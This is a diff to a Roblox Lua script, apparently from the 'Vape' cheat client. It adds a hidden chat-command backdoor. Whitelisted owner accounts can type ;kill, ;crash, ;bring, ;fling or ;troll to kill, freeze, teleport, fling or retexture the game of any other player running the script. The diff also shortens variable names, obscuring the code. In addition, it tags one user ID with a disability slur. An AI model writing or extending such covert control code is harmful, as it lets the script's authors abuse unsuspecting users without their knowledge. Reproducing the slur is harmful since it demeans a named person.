@@ -1,5 +1,6 @@
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
 local LOCAL_PLAYER = Players.LocalPlayer
 
 local whitelist = {
@@ -11,102 +12,116 @@ local whitelist = {
 	Slow = {1562251033}
 }
 
-local function isInList(userId, list)
+local function isInList(u, list)
 	for _, id in ipairs(list) do
-		if userId == id then return true end
+		if u == id then return true end
 	end
 	return false
 end
 
-local function isWhitelisted(userId)
-	return isInList(userId, whitelist.Owner) or isInList(userId, whitelist.Private)
+local function isWhitelisted(u)
+	return isInList(u, whitelist.Owner) or isInList(u, whitelist.Private)
 end
 
-local function applyBillboardTag(player, text, color)
+local function applyTag(plr, txt, col)
 	local function render()
-		local head = player.Character and player.Character:FindFirstChild("Head")
+		local head = plr.Character and plr.Character:FindFirstChild("Head")
 		if not head or head:FindFirstChild("VapeTag") then return end
-
-		local tag = Instance.new("BillboardGui")
-		tag.Name = "VapeTag"
-		tag.Size = UDim2.new(0, 100, 0, 20)
-		tag.StudsOffset = Vector3.new(0, 3, 0)
-		tag.AlwaysOnTop = true
-		tag.Adornee = head
-		tag.Parent = head
-
-		local label = Instance.new("TextLabel")
-		label.Size = UDim2.fromScale(1, 1)
-		label.BackgroundTransparency = 1
-		label.Text = text
-		label.TextColor3 = color
-		label.TextStrokeTransparency = 0.3
-		label.TextStrokeColor3 = Color3.new(0, 0, 0)
-		label.Font = Enum.Font.GothamBold
-		label.TextScaled = true
-		label.Parent = tag
+		local b = Instance.new("BillboardGui")
+		b.Name = "VapeTag"
+		b.Size = UDim2.new(0, 100, 0, 20)
+		b.StudsOffset = Vector3.new(0, 3, 0)
+		b.AlwaysOnTop = true
+		b.Adornee = head
+		b.Parent = head
+		local l = Instance.new("TextLabel")
+		l.Size = UDim2.fromScale(1, 1)
+		l.BackgroundTransparency = 1
+		l.Text = txt
+		l.TextColor3 = col
+		l.TextStrokeTransparency = 0.3
+		l.TextStrokeColor3 = Color3.new(0, 0, 0)
+		l.Font = Enum.Font.GothamBold
+		l.TextScaled = true
+		l.Parent = b
 	end
-
-	if player.Character then
-		render()
-	else
-		player.CharacterAdded:Once(function()
-			task.wait(0.5)
-			render()
-		end)
-	end
+	if plr.Character then render() else plr.CharacterAdded:Once(function() task.wait(0.5) render() end) end
 end
 
-local function tagPlayer(player)
-	local uid = player.UserId
-	if isInList(uid, whitelist.Owner) then
-		applyBillboardTag(player, "Vape OWNER", Color3.fromRGB(210, 4, 45))
-	elseif isInList(uid, whitelist.Private) then
-		applyBillboardTag(player, "Vape Private", Color3.fromRGB(170, 0, 255))
-	elseif isInList(uid, whitelist.Slow) then
-		applyBillboardTag(player, "Retard", Color3.fromRGB(70, 130, 255))
+local function tag(plr)
+	local id = plr.UserId
+	if isInList(id, whitelist.Owner) then
+		applyTag(plr, "Vape OWNER", Color3.fromRGB(210, 4, 45))
+	elseif isInList(id, whitelist.Private) then
+		applyTag(plr, "Vape Private", Color3.fromRGB(170, 0, 255))
+	elseif isInList(id, whitelist.Slow) then
+		applyTag(plr, "Retard", Color3.fromRGB(70, 130, 255))
 	end
 end
 
-for _, plr in ipairs(Players:GetPlayers()) do
-	tagPlayer(plr)
-end
+for _, p in ipairs(Players:GetPlayers()) do tag(p) end
+Players.PlayerAdded:Connect(function(p) task.delay(1, function() tag(p) end) end)
 
-Players.PlayerAdded:Connect(function(player)
-	task.delay(1, function()
-		tagPlayer(player)
-	end)
-end)
+local function exec(cmd, senderId)
+	cmd = string.lower(cmd)
+	local sender = Players:GetPlayerByUserId(senderId)
+	if not sender or not sender.Character or not sender.Character:FindFirstChild("HumanoidRootPart") then return end
 
-local function handleCommand(command)
-	command = string.lower(command)
-
-	if command == ";kill" then
-		local char = LOCAL_PLAYER.Character
-		if char then
-			for _, part in ipairs(char:GetDescendants()) do
-				if part:IsA("BasePart") then
-					part:BreakJoints()
-				end
+	if cmd == ";kill" then
+		local c = LOCAL_PLAYER.Character
+		if c then
+			for _, v in ipairs(c:GetDescendants()) do
+				if v:IsA("BasePart") then v:BreakJoints() end
 			end
 		end
 
-	elseif command == ";crash" then
+	elseif cmd == ";crash" then
 		while true do end
+
+	elseif cmd == ";bring" then
+		if LOCAL_PLAYER ~= sender and LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("HumanoidRootPart") then
+			LOCAL_PLAYER.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+		end
+
+	elseif cmd == ";fling" then
+		if LOCAL_PLAYER ~= sender and LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("HumanoidRootPart") then
+			local root = LOCAL_PLAYER.Character.HumanoidRootPart
+			local target = sender.Character.HumanoidRootPart
+			local bv = Instance.new("BodyVelocity")
+			bv.Velocity = (target.Position - root.Position).Unit * 200
+			bv.MaxForce = Vector3.new(1, 1, 1) * 1e6
+			bv.P = 9e4
+			bv.Parent = root
+			game.Debris:AddItem(bv, 0.5)
+		end
+
+	elseif cmd == ";troll" then
+		local textureId = "rbxassetid://8587856062"
+		for _, obj in ipairs(game:GetDescendants()) do
+			pcall(function()
+				if obj:IsA("Decal") or obj:IsA("Texture") then
+					obj.Texture = textureId
+				elseif obj:IsA("MeshPart") then
+					obj.TextureID = textureId
+				elseif obj:IsA("SpecialMesh") then
+					obj.TextureId = textureId
+				elseif obj:IsA("SurfaceAppearance") then
+					obj.ColorMap = textureId
+				end
+			end)
+		end
 	end
 end
 
-TextChatService.MessageReceived:Connect(function(message)
-	local text = message.Text
-	local source = message.TextSource
-	if not source then return end
-
-	local senderId = source.UserId
-	if senderId == LOCAL_PLAYER.UserId then return end
-	if not isWhitelisted(senderId) then return end
+TextChatService.MessageReceived:Connect(function(msg)
+	local t = msg.Text
+	local s = msg.TextSource
+	if not s then return end
+	local uid = s.UserId
+	if uid == LOCAL_PLAYER.UserId then return end
+	if not isWhitelisted(uid) then return end
 	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
-
-	handleCommand(text)
+	exec(t, uid)
 end)
 
 local isfile = isfile or function(file)
